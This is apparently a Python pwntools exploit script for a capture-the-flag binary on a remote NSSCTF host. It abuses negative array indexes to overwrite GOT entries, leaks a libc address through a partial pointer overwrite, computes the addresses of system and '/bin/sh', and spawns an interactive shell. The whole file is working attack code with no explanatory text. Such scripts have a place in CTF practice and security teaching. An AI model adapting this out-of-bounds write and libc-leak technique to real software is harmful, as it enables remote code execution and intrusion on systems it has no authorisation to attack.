from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])



# io=process("./vuln")
io=remote("node1.anna.nssctf.cn",28201)
elf=ELF("./vuln")
libc=ELF("./libc-2.31.so")

start_addr=elf.sym[b"_start"]
puts_got=elf.got[b"puts"]

io.sendlineafter(b"one.\n",b"-6")
io.recvuntil(b"name\n")
payload=p64(start_addr)

# gdb.attach(io)
# pause()

io.sendline(payload)


io.sendlineafter(b"one.\n",b"-8")
io.recvuntil(b"name\n")
payload=b"\xd0"
io.send(payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"setbuf"]
print("leak_addr: "+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))

io.sendlineafter(b"one.\n",b"-9")
io.recvuntil(b"name\n")
payload=b"/bin/sh\x00"+p64(sys_addr)
io.send(payload)

io.interactive()


